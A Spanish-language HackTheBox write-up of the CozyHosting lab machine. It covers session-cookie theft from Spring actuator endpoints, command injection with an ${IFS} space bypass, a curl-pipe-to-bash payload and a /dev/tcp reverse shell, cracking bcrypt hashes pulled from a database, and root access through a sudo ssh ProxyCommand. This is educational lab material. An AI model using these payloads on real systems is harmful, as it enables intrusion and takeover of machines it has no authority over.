---
layout: default
title: CozyHosting
parent: HackTheBox
grand_parent: Writeups
---

# CozyHosting
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos un sitio web donde descubriremos que usa **Spring**, haciendo fuzzing de directorios, descubriremos un archivo que tiene informacion de unas cookies de sesion que usaremos para iniciar como **kanderson**, una vez dentro veremos que el sitio web intenta conectarse usando ssh, conforme a eso, descubriremos que interpreta **bash** y es vulnerable a **Command Injection**, haciendo bypass de los espacios en blanco nos mandaremos una reverse shell, despues haremos un movimiento lateral de **app** a **josh** mediante la decompilacion de un **.jar**, y descubriremos credenciales para postresql, enumerando un poco, encontraremos las credenciales de ssh para el usuario **josh**, y para la escalada abusaremos de ssh a nivel de sudoers

{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 10.10.11.230
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay dos puertos abiertos:

```ruby
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo esos puertos:

```ruby
nmap -sCV -p22,80 10.10.11.230
```

```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el puerto **22** no vamos a poder hacer nada, en el puerto **80** vemos que nos redirije a **cozyhosting.htb**, asi que lo agregaremos al **/etc/hosts**


### Fuzzing de diretorios

Podemos usar **wffuzz** para enumerar directorios mediante fuerza bruta:

```ruby
wfuzz -u 'http://cozyhosting.htb/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404
```

Nos descubrio las rutas:

- login
- admin --> login
- logout
- error

### Analisis del sitio web (/error)

Para no hacerlo tan largo, en login, admin y logout no vamos a poder hacer nada, sin embargo, en la ruta **/error** vamos a descubrir algunas cosas, cuando entramos nos muestra un sitio de error

![](/assets/img/htb-cozyHosting/1.png)

El mensaje de **Whitelabel Error Page** es un mensaje de error de un sitio web que usa **Spring boot** (si no me crees solo pon ese mensaje en google), debido a que Spring tiene sus propios directorios, podemo volver a hacer directory fuzzing pero usando esta lista [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)

```ruby
wfuzz -u 'http://cozyhosting.htb/FUZZ' -w /usr/share/wordlists/spring-boot.txt -t 100 --hc=404
```

```ruby
000000058:   200        0 L      108 W      9938 Ch     "actuator/mappings"
000000051:   200        0 L      1 W        15 Ch       "actuator/health"                                                                      
000000072:   200        0 L      1 W        98 Ch       "actuator/sessions"                                                                      
000000038:   200        0 L      120 W      4957 Ch     "actuator/env"                                                                      
000000041:   200        0 L      13 W       487 Ch      "actuator/env/lang"                                                                      
000000029:   200        0 L      1 W        634 Ch      "actuator"                                                                      
000000039:   200        0 L      13 W       487 Ch      "actuator/env/home"
000000044:   200        0 L      13 W       487 Ch      "actuator/env/path"                                                                    
000000113:   200        284 L    745 W      12706 Ch    "http://cozyhosting.htb/"
000000032:   200        0 L      542 W      127224 Ch   "actuator/beans"
```

Solo con ver el nombre de las rutas, me da a entender que la aplicacion esta usando **actuators**, basicamente es un modulo de Spring que provee funciones de monitoreo, metricas, y funciones extra para endpoints, una ruta interesante es la de **/actuator/sessions**, segun la documentacion es: **The sessions endpoint provides information about the application’s HTTP sessions that are managed by Spring Session.**

Si ingresamos a **http://cozyhosting.htb/actuator/sessions** vamos a poder ver dos usuarios y lo que parece ser una cookie

```json
{
    "382C3D6F5B4B57647B8CCAD80F99574C":"kanderson",
    "471206F75AC37D6938DA9CB2E27A20DD":"UNAUTHORIZED"
}
```

Si inspeccionamos el sitio web y nos vamos a **Storage**, vamos a poder ver una cookie con el nombre de **JSESSIONID**, si modificamos ese valor por el de **382C3D6F5B4B57647B8CCAD80F99574C** y recargamos la pagina, vamos a poder ver que entramos como **kanderson**


### Analisis de cozyhosting.htb/admin

![](/assets/img/htb-cozyHosting/2.png)

Vemos que nos sale un formulario con un mensaje que dice mas o menos asi: **Para que Cozy Scanner se conecte, la clave privada que recibió al registrarse debe incluirse en el archivo .ssh/authorised_keys de su host**

Si ponemos cualquier cosa en el formulario, nos sale un mensaje de error

![](/assets/img/htb-cozyHosting/3.png)

Es curioso, por que puedo deducir que se esta intentando conectar por ssh a **c4rta**.

Interceptare la peticion con burp y lo analizaremos mas a fondo

![](/assets/img/htb-cozyHosting/4.png)

Primero vemos que esta haciendo una peticion por POST a **POST /executessh**, ademas tenemos el parametro **hostname** y **username**, con esa informacion sabemos que esta ejecutando el comando ssh, en este punto podemos empezar a jugar con el valor de los parametros, y observa que pasa cuando se deja el parametro **username** vacio:

![](/assets/img/htb-cozyHosting/5.png)

Nos sale el tipico mensaje de ayuda de como usar SSH, similar a esto:

![](/assets/img/htb-cozyHosting/6.png)

Es curioso por que ese comando se ejecuta como uno de sistema en la maquina victima, y mas por que podemos modificar el valor del parametro **username**, entonces que pasara si ahora le ponemos esto: **;whoami**

![](/assets/img/htb-cozyHosting/7.png)

Observa como al final sale: **/bin/bash: line 1: whoami@c4rta: command not found**

Ahora con esto sabemos que interpreta bash, y esto es potencialmente un **Command injection**

## Command injection


Si intentamos hacer uso de un **echo**, nos va a salir que no aceptan espacios:

```ruby
Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
```
No es un problema, por que en GNU/Linux hay una variable de entorno que se llama **IFS** la cual contiene separadores de palabras, si le hacemos un echo, vemos que sale todo blanco, pero en realidad hay un espacio

![](/assets/img/htb-cozyHosting/8.png)

Asi que podemos usar IFS para interpretar el espacio y hacer bypass de ese filtro, para probar si podemos ejecutar comandos, nos podremos en escucha por tcpdump por la interfaz tun0:

```ruby
tcpdump -i tun0 -n icmp
```

Y en el username lo indicaremos asi:
```bash
;ping${IFS}<ip>;
```

Observa como pudimos ejecutar el ping

![](/assets/img/htb-cozyHosting/9.png)

Ya esta confirmadisimo que podemos ejecutar comandos, asi que nos mandaremos una reverse shell:

```ruby
;curl${IFS}<ip>:8080/pwn.sh|bash;
```

En el pwn.sh tengo esto:

```ruby
bash -i >& /dev/tcp/<ip>/4444 0>&1
```

Y nos deberia de llegar una rev shell

## Moviento laterial: app --> josh y flag de user

Al listar el cotenido podemos ver que tenemos un jar

```ruby
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

Adicionalmente si exploramos el directorio **home**, vamos a poder ver al directorio del usuario josh

```ruby
app@cozyhosting:/home$ ls -l
total 4
drwxr-x--- 3 josh josh 4096 Aug  8 10:19 josh
```

Para pasarnos el archivo, en la maquina victima usare python para crear un servidor web

```ruby
python3 -m http.server 8086
```

Y en mi maquina solamente me lo descargare:

```ruby
wget http://cozyhosting.htb:8086/cloudhosting-0.0.1.jar
```

Como es un archivo jar, y no tengo un IDE para analizarlo, usare esta pagina para decompilarlo [https://jdec.app/](https://jdec.app/)

Al explorarlo un poco, vamos a poder ver credenciales para postgresql

![](/assets/img/htb-cozyHosting/10.png)

Asi que en la reverse shell que conseguimos, nos conectaremos:

```ruby
psql -U postgres -W -h 127.0.0.1 -d cozyhosting
```

Listamos las bases de datos con: **\l**:

![](/assets/img/htb-cozyHosting/11.png)

En mi caso yo ya estoy conectado a la base de datos **cozyhosting**, pero en caso de que no, usa el comando: **\c cozyhosting**

Si mostramos las tablas tenemos varias:

```ruby
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)
```

Si hacemos un select de users, vamos a ver dos hashes

```ruby
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Intentaremos crackear el de admin usando John

![](/assets/img/htb-cozyHosting/12.png)

Y tenemos la contraseña: **manchesterunited** para el usuario **Josh**

Ahora ya nos podemos conectar por SSH

```ruby
josh@cozyhosting:~$ ls -l | grep user.txt
-rw-r----- 1 root josh 33 Sep 15 20:32 user.txt
```

Si mostramos permisos a nivel de sudoers usando **sudo -l**: tenemos el ssh

```ruby
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Haciendo una busqueda rapida en [GTOBins](https://gtfobins.github.io/gtfobins/ssh/) podemos ver que podemos hacernos root ejecutando:

```ruby
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Y ya seriamos root:

![](/assets/img/htb-cozyHosting/13.png)

Eso ha sido todo, gracias por leer ❤